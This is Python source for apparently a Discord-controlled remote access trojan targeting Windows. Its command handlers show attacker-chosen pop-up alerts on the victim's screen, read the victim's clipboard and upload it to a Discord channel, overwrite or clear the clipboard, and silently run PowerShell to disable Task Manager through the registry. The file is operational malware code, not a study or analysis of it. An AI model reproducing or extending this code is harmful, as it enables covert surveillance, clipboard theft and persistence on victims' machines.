import asyncio,ctypes,pyperclip,os,discord,subprocess
import pyperclip
import os
from discord import Embed
from discord.ext import commands
from discord import Embed
async def alert(ctx, *, args=None):
    if not args or ',' not in args:
        embed = discord.Embed(
            title="Invalid Arguments",
            description="You must provide a message and a title separated by a comma.\n\n**Usage:** `.alert <message>, <title>`\n**Example:** `.alert error here, PC is done`",
            color=discord.Color.red()
        )
        embed.set_footer(text="ALERT COMMAND")
        await ctx.send(embed=embed)
        return

    msg, title = map(str.strip, args.split(',', 1))

    async def show_alert(msg, title):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, ctypes.windll.user32.MessageBoxW, 0, msg, title, 0x30)
        except Exception:
            pass

    asyncio.create_task(show_alert(msg, title))

    embed = discord.Embed(
        title="🔔 Alert Shown",
        description=f"**Title:** `{title}`\n**Message:** ```{msg}```",
        color=discord.Color.green()
    )
    embed.set_footer(text="ALERT SENT")
    await ctx.send(embed=embed)

async def cb(ctx, *, action: str = None):
    content = ctx.message.content.strip()

    if content.startswith(".cb write "):
        text = content[len(".cb write "):].strip()
        if text:
            pyperclip.copy(text)
            await ctx.send(f"Copied: {text}")
        else:
            await ctx.send("Provide text to copy.")
        return

    if content.startswith(".cb get"):
        text = pyperclip.paste()
        if text:
            path = os.path.join(os.path.expanduser('~/Documents/cb'), "clipboard.txt")
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(text)
            await ctx.send(file=discord.File(path, "clipboard.txt"))
        else:
            await ctx.send("Clipboard empty.")
        return

    if content.startswith(".cb clear"):
        pyperclip.copy("")
        await ctx.send("Clipboard cleared.")
        return

    embed = Embed(title="Clipboard Commands", color=discord.Color.green())
    embed.add_field(name=".cb write <text>", value="Write text to clipboard", inline=False)
    embed.add_field(name=".cb get", value="Get clipboard contents", inline=False)
    embed.add_field(name=".cb clear", value="Clear clipboard.", inline=False)
    embed.add_field(name=".cb help", value="Show this message.", inline=False)
    await ctx.send(embed=embed)

async def taskmanagerset(ctx, action: str):
    if action.lower() not in ["enable", "disable"]:
        await ctx.send("Invalid action. Use `enable` or `disable`.")
        return

    try:
        script = (
            "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableTaskMgr' -Value 0"
            if action.lower() == "enable"
            else "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableTaskMgr' -Value 1"
        )
        subprocess.run(["powershell", "-Command", script], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
        await ctx.send(f"Task Manager has been {action}d.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Failed to {action} Task Manager: {e}")